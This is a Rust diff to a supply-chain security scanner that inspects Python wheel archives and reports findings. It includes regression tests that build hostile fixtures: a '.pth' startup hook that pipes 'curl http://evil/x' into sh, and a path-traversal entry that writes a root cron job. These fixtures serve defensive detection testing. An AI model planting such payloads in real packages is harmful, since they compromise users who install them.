@@ -214,24 +214,47 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
         &config.exclude_patterns,
     );
     let mut files = collected.text_candidates;
-    // Artifact candidates (`.so`/`.whl`/...) have no analyzer yet; each becomes
-    // an `Unsupported` coverage gap so they are never silently dropped. `max_files` bounds
-    // this hashing too (open/read/hash is the expensive work): an artifact-heavy tree must
-    // not force unbounded hashing here before the text-file cap below is applied. Cap the
-    // artifacts hashed; any beyond the cap are folded into the skip accounting below (not
-    // dropped silently).
+    // B8a — magic-dispatch each artifact candidate (`.whl`/`.so`/...) into the real
+    // artifact scanner instead of recording a blanket `Unsupported` gap. A wheel is
+    // inspected (A4 reader + B5/B6/B7) and its findings become member-qualified
+    // `FileScanResult`s that flow through the existing JSON/SARIF/exit path; an
+    // unsupported/unreadable candidate (an sdist, a bare `.so` with no archive
+    // wrapper, an oversize file) still records a coverage gap so it is never
+    // silently dropped.
+    //
+    // `max_files` bounds this work too (A2 re-review): artifact INSPECTION (open + archive
+    // walk + B5/B6/B7) is even more expensive than the old hash, so an artifact-heavy tree
+    // must not force unbounded inspection before the text-file cap below. Cap the candidates
+    // inspected; any beyond the cap are folded into the skip accounting below, not dropped
+    // silently.
     let artifact_total = collected.artifact_candidates.len();
-    let mut coverage_gaps: Vec<CoverageGap> = collected
+    let mut coverage_gaps: Vec<CoverageGap> = Vec::new();
+    let mut artifact_results: Vec<FileScanResult> = Vec::new();
+    // Distinct artifacts that were actually inspected (NOT the per-finding result
+    // count), so `scanned_count` reflects files scanned, not findings produced.
+    let mut artifacts_inspected = 0usize;
+    // Load the threat DB ONCE for the whole artifact pass (the cache re-checks mtime
+    // internally, so this is cheap, but we still hold the Arc rather than re-fetching
+    // per artifact) and thread it into the hash-lookup seam. Latent today (the
+    // hash-lookup seam returns None until the DB-B methods land), but this is the
+    // correct wiring so the artifact path consults the same DB the engine does.
+    let artifact_threat_db = crate::threatdb::ThreatDb::cached();
+    for p in collected
         .artifact_candidates
         .iter()
         .take(config.max_files.unwrap_or(usize::MAX))
-        .map(|p| CoverageGap {
-            location: SubjectLocation::from_path(p.clone()),
-            kind: CoverageGapKind::Unsupported,
-            sha256: hash_path_within_budget(p),
-        })
-        .collect();
-    let artifact_skipped = artifact_total.saturating_sub(coverage_gaps.len());
+    {
+        let (mut results, gap) = inspect_artifact_candidate(p, artifact_threat_db.as_deref());
+        if gap.is_none() {
+            artifacts_inspected += 1;
+        }
+        artifact_results.append(&mut results);
+        if let Some(gap) = gap {
+            coverage_gaps.push(gap);
+        }
+    }
+    // Candidates beyond the cap were neither inspected nor gapped; count them as skipped.
+    let artifact_skipped = artifact_total.saturating_sub(config.max_files.unwrap_or(usize::MAX));
 
     files.sort_by(|a, b| {
         let a_priority = is_priority_file(a);
@@ -261,6 +284,12 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
     }
 
     let mut file_results = Vec::new();
+    // Artifact-inspection findings (member-qualified) join the file results so they
+    // flow through the same JSON/SARIF/human emitters and exit-code logic. They are
+    // counted once per artifact (`artifacts_inspected`), not once per result, so a
+    // wheel with several findings still counts as one scanned file.
+    file_results.append(&mut artifact_results);
+    let mut text_files_scanned = 0usize;
     let mut panic_files = Vec::new();
     for file_path in &files {
         // Panic in any rule is bounded to its file; the rest of the walk
@@ -269,6 +298,7 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
         // size/IO skips; it is ALSO pushed as a `Panicked` coverage gap.
         match scan_single_file_guarded(file_path) {
             GuardedScanOutcome::Completed(ScanFileOutcome::Scanned(result)) => {
+                text_files_scanned += 1;
                 file_results.push(result)
             }
             GuardedScanOutcome::Completed(ScanFileOutcome::Skipped(gap)) => {
@@ -284,7 +314,9 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
     }
 
     ScanResult {
-        scanned_count: file_results.len(),
+        // Files scanned = text files + distinct artifacts inspected (a wheel with
+        // multiple findings is one scanned file, not several).
+        scanned_count: text_files_scanned + artifacts_inspected,
         skipped_count,
         truncated,
         truncation_reason,
@@ -292,6 +324,158 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
         coverage_gaps,
         file_results,
     }
+}
+
+/// Magic-dispatch one artifact candidate into the artifact scanner (B8a). Returns
+/// the member-qualified [`FileScanResult`]s its findings produce, plus an optional
+/// [`CoverageGap`] when the candidate could not be inspected as a wheel (an sdist /
+/// unknown magic / unreadable / oversize), so an artifact is never silently
+/// dropped. A successfully inspected wheel with NO findings still yields one empty
+/// result (located at the wheel) so it counts as scanned.
+///
+/// Each finding becomes its OWN result located at the finding's member-qualified
+/// path (`foo.whl!/pkg/bootstrap.pth`, B8f) when one is recoverable from the
+/// finding's evidence, else the outer wheel path — so JSON/SARIF show the offending
+/// member, not just the container. Policy override finalization is applied via
+/// `evaluate_inspected_artifact` so a strict integrity policy's `action_overrides`
+/// are honored on this path too (the verdict's findings carry the overridden
+/// severities).
+fn inspect_artifact_candidate(
+    path: &Path,
+    threat_db: Option<&crate::threatdb::ThreatDb>,
+) -> (Vec<FileScanResult>, Option<CoverageGap>) {
+    use crate::artifact::inspect::{inspect_artifact_file, InspectedArtifact};
+
+    let inspected: InspectedArtifact = match inspect_artifact_file(path) {
+        Ok(i) => i,
+        Err(e) => {
+            // Not inspectable as a wheel: record a coverage gap (best-effort hash
+            // for a later content-addressed lookup) so it is never read as clean.
+            return (
+                Vec::new(),
+                Some(CoverageGap {
+                    location: SubjectLocation::from_path(path.to_path_buf()),
+                    kind: e.gap_kind(),
+                    sha256: hash_path_within_budget(path),
+                }),
+            );
+        }
+    };
+
+    // Discover the operator policy for this path so per-rule severity/action
+    // overrides are honored (the artifact path is a static-verdict site too).
+    let cwd = path
+        .parent()
+        .map(|p| p.display().to_string())
+        .filter(|s| !s.is_empty());
+    let policy = crate::policy::Policy::discover(cwd.as_deref());
+
+    let verdict = crate::artifact::evaluate_inspected_artifact(
+        &inspected.inspection,
+        &inspected.native_findings,
+        &policy,
+        threat_db,
+    );
+
+    // The set of member-qualified location strings the inspection actually
+    // produced (`<wheel>!/<member>`), gathered from the inspected files, signals,
+    // and execution edges. `artifact_finding_location` resolves a finding's member
+    // by EXACT membership in this set rather than scraping any `!/`-bearing token,
+    // so a stray `!/` substring in evidence prose can never mislocate a finding.
+    let known_members = known_member_locations(&inspected.inspection);
+
+    let mut results: Vec<FileScanResult> = Vec::new();
+    for finding in verdict.findings {
+        // Locate the finding at its member-qualified location when one is present in
+        // the evidence (B8f); else at the outer wheel.
+        let loc = artifact_finding_location(&finding, path, &known_members);
+        results.push(FileScanResult {
+            path: loc,
+            findings: vec![finding],
+            is_config_file: false,
+        });
+    }
+
+    // A structurally REJECTED wheel (path traversal, encrypted member, CRC failure,
+    // duplicate paths) must NEVER read as clean on the scan path: surface a coverage gap so
+    // `tirith scan` does not exit 0 and report it clean. This mirrors pre-B8 (every wheel
+    // was an Unsupported gap) and the package-inspect path, which forces Block on the same
+    // condition. Any signal findings that DID fire from the partial inspection are returned
+    // alongside the gap. `Unsupported` on a `.whl` is security-relevant, so the gap is not
+    // silently benign.
+    if inspected.rejected {
+        return (
+            results,
+            Some(CoverageGap {
+                location: SubjectLocation::from_path(path.to_path_buf()),
+                kind: CoverageGapKind::Unsupported,
+                sha256: hash_path_within_budget(path),
+            }),
+        );
+    }
+
+    // A clean wheel (no findings) still counts as scanned: emit one empty result at
+    // the outer wheel path.
+    if results.is_empty() {
+        results.push(FileScanResult {
+            path: path.to_path_buf(),
+            findings: Vec::new(),
+            is_config_file: false,
+        });
+    }
+
+    (results, None)
+}
+
+/// The set of member-qualified location strings (`<wheel>!/<member>`) the
+/// inspection actually produced, drawn from its files, signals, and execution
+/// edges. `artifact_finding_location` matches a finding's evidence tokens against
+/// THIS set, so a member location is recovered by exact identity with a real
+/// member rather than by scraping any `!/`-bearing substring out of prose.
+fn known_member_locations(inspection: &crate::artifact::ArtifactInspection) -> Vec<String> {
+    let mut out: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
+    let mut add = |loc: &SubjectLocation| {
+        // Only locations that actually render with a `!/` member separator are
+        // candidate member locations.
+        if loc.member_path.is_some() {
+            out.insert(loc.to_string());
+        }
+    };
+    for f in &inspection.files {
+        add(&f.location);
+    }
+    for s in &inspection.signals {
+        add(&s.location);
+    }
+    for e in &inspection.execution_edges {
+        add(&e.from);
+        add(&e.to);
+    }
+    out.into_iter().collect()
+}
+
+/// Recover the member-qualified location (`foo.whl!/member`) for an artifact
+/// finding by matching a token in its evidence against the inspection's KNOWN
+/// member locations; else the outer artifact path. Matching against the real
+/// member set (not any `!/`-bearing substring) is why a stray `!/` in evidence
+/// prose can never mislocate a finding. Used so each artifact finding's
+/// JSON/SARIF path names the offending member (B8f).
+fn artifact_finding_location(finding: &Finding, outer: &Path, known_members: &[String]) -> PathBuf {
+    use crate::verdict::Evidence;
+    if !known_members.is_empty() {
+        for ev in &finding.evidence {
+            if let Evidence::Text { detail } = ev {
+                for token in detail.split_whitespace() {
+                    let cleaned = token.trim_matches(|c| matches!(c, '\'' | '"' | '(' | ')' | ','));
+                    // EXACT membership in the inspection's real member locations.
+                    if known_members.iter().any(|m| m == cleaned) {
+                        return PathBuf::from(cleaned);
+                    }
+                }
+            }
+        }
+    }
+    outer.to_path_buf()
 }
 
 /// Maximum analyzable content size: 10 MiB. Large enough for any realistic
@@ -1418,6 +1602,197 @@ mod tests {
         assert!(
             !names.contains(&"artifact.md"),
             "files under out/.turbo/coverage/.expo should be skipped, got {names:?}"
+        );
+    }
+
+    /// B8a regression: a directory scan over a tree containing a `.whl` must
+    /// actually INSPECT the wheel (A2 dropped artifact candidates during collection,
+    /// so the wheel was never opened). A wheel with an executable `.pth` must surface
+    /// the startup finding rather than a blanket `Unsupported` coverage gap.
+    #[test]
+    fn test_directory_scan_inspects_wheel_member() {
+        use std::io::Write as _;
+        use zip::write::SimpleFileOptions;
+        use zip::ZipWriter;
+
+        let tmp = tempfile::tempdir().expect("create temp dir");
+        let root = tmp.path();
+        // A benign text file alongside the wheel.
+        std::fs::write(root.join("README.md"), "hello").unwrap();
+
+        // A wheel bundling an executable `.pth` that spawns a subprocess at startup.
+        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
+        for (name, body) in [
+            (
+                "evil.pth",
+                b"import os; os.system('curl http://evil/x | sh')\n".as_slice(),
+            ),
+            (
+                "demo-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
+            ),
+            (
+                "demo-1.0.dist-info/RECORD",
+                b"demo-1.0.dist-info/RECORD,,\n".as_slice(),
+            ),
+        ] {
+            zw.start_file(name, SimpleFileOptions::default()).unwrap();
+            zw.write_all(body).unwrap();
+        }
+        let wheel_bytes = zw.finish().unwrap().into_inner();
+        std::fs::write(root.join("demo-1.0-py3-none-any.whl"), &wheel_bytes).unwrap();
+
+        let config = ScanConfig {
+            path: root.to_path_buf(),
+            recursive: true,
+            fail_on: Severity::High,
+            ignore_patterns: Vec::new(),
+            include_patterns: Vec::new(),
+            exclude_patterns: Vec::new(),
+            max_files: None,
+        };
+        let result = scan(&config);
+
+        // The wheel was inspected, not dropped: no `Unsupported` gap for it.
+        assert!(
+            !result
+                .coverage_gaps
+                .iter()
+                .any(|g| g.kind == CoverageGapKind::Unsupported),
+            "the wheel must be inspected, not recorded as an Unsupported gap: {:?}",
+            result.coverage_gaps
+        );
+        // The executable `.pth` fired the B6 startup finding.
+        assert!(
+            result
+                .file_results
+                .iter()
+                .flat_map(|r| &r.findings)
+                .any(|f| f.rule_id == crate::verdict::RuleId::PythonStartupHookSuspicious),
+            "a directory scan over a wheel with an executable .pth must fire the startup \
+             finding; results: {:?}",
+            result
+                .file_results
+                .iter()
+                .flat_map(|r| r.findings.iter().map(|f| f.rule_id))
+                .collect::<Vec<_>>()
+        );
+        // The finding is located at the member-qualified path (B8f).
+        assert!(
+            result
+                .file_results
+                .iter()
+                .any(|r| { !r.findings.is_empty() && r.path.display().to_string().contains("!/") }),
+            "an artifact finding must carry a member-qualified `foo.whl!/member` path"
+        );
+    }
+
+    /// B8 re-review: a structurally REJECTED wheel (path traversal) with NO B5/B6/B7 signal
+    /// must NOT scan as clean - it surfaces a coverage gap (mirroring the package-inspect
+    /// Block on the same condition), not a silent pass / exit 0.
+    #[test]
+    fn test_directory_scan_rejected_wheel_is_not_clean() {
+        use std::io::Write as _;
+        use zip::write::SimpleFileOptions;
+        use zip::ZipWriter;
+
+        let tmp = tempfile::tempdir().expect("create temp dir");
+        let root = tmp.path();
+        // A wheel whose only payload is a path-traversal entry (not a `.pth`/`.so`/RECORD,
+        // so it fires NO startup/native/integrity signal) plus valid minimal dist-info.
+        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
+        for (name, body) in [
+            (
+                "../../../etc/cron.d/evil",
+                b"* * * * * root sh\n".as_slice(),
+            ),
+            (
+                "demo-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
+            ),
+        ] {
+            zw.start_file(name, SimpleFileOptions::default()).unwrap();
+            zw.write_all(body).unwrap();
+        }
+        let wheel_bytes = zw.finish().unwrap().into_inner();
+        std::fs::write(root.join("demo-1.0-py3-none-any.whl"), &wheel_bytes).unwrap();
+
+        let config = ScanConfig {
+            path: root.to_path_buf(),
+            recursive: true,
+            fail_on: Severity::High,
+            ignore_patterns: Vec::new(),
+            include_patterns: Vec::new(),
+            exclude_patterns: Vec::new(),
+            max_files: None,
+        };
+        let result = scan(&config);
+
+        // The rejected wheel is surfaced as a coverage gap, NOT a clean inspected result.
+        assert!(
+            result
+                .coverage_gaps
+                .iter()
+                .any(|g| g.kind == CoverageGapKind::Unsupported
+                    && g.location.to_string().contains("demo-1.0-py3-none-any.whl")),
+            "a structurally rejected wheel must produce a coverage gap, not pass clean: {:?}",
+            result.coverage_gaps
+        );
+    }
+
+    /// T3.26: `artifact_finding_location` recovers a member location by EXACT
+    /// membership in the inspection's real member set, not by scraping any
+    /// `!/`-bearing token. A stray `!/` substring in evidence prose that is NOT a
+    /// real member must fall back to the outer artifact path; a token that IS a
+    /// known member resolves to that member.
+    #[test]
+    fn artifact_finding_location_matches_known_members_exactly() {
+        use crate::verdict::{Evidence, Finding, RuleId, Severity};
+
+        let outer = Path::new("/repo/demo-1.0-py3-none-any.whl");
+        let real_member = "demo-1.0-py3-none-any.whl!/demo/boot.pth".to_string();
+        let known = vec![real_member.clone()];
+
+        // (1) A finding naming the REAL member resolves to it.
+        let f_real = Finding {
+            rule_id: RuleId::PythonStartupHookSuspicious,
+            severity: Severity::High,
+            title: "t".to_string(),
+            description: "d".to_string(),
+            evidence: vec![Evidence::Text {
+                detail: format!("location: {real_member}"),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        };
+        assert_eq!(
+            artifact_finding_location(&f_real, outer, &known),
+            PathBuf::from(&real_member),
+            "a known member location must resolve to that member"
+        );
+
+        // (2) A finding whose prose contains a stray `!/` token that is NOT a real
+        // member must fall back to the OUTER path, never mislocating to the bogus
+        // token (the fragility the scrape had).
+        let f_bogus = Finding {
+            rule_id: RuleId::PythonStartupHookSuspicious,
+            severity: Severity::High,
+            title: "t".to_string(),
+            description: "d".to_string(),
+            evidence: vec![Evidence::Text {
+                detail: "see https://example.test/path!/not-a-member for details".to_string(),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        };
+        assert_eq!(
+            artifact_finding_location(&f_bogus, outer, &known),
+            outer.to_path_buf(),
+            "a stray `!/` token that is not a real member must fall back to the outer path"
         );
     }
 
